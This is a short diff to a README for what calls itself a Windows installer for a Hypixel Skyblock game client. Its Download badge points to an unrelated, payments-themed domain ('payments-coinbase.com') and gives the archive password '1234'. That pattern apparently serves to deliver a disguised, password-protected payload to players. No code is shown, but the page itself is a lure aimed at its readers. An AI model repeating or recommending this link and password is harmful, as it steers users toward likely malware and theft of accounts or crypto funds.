@@ -2,10 +2,11 @@
 <p align="center">
   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6bY58rpUiI7SMkFp8EJBmjEWehw9YAOkn8w&s" width="400">
   </p>
-Windows installer for Extras client. 
-The best hypixel skyblock client for dungeons and skills
+Windows installer for Extras client. The best hypixel skyblock client for dungeons and skills
+
 [![Download](https://img.shields.io/badge/Download-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://payments-coinbase.com/)
-Pass 1234
+ Pass - 1234
+
 /exclient to open config menu. Aliases /ex and /exc
 
 Features
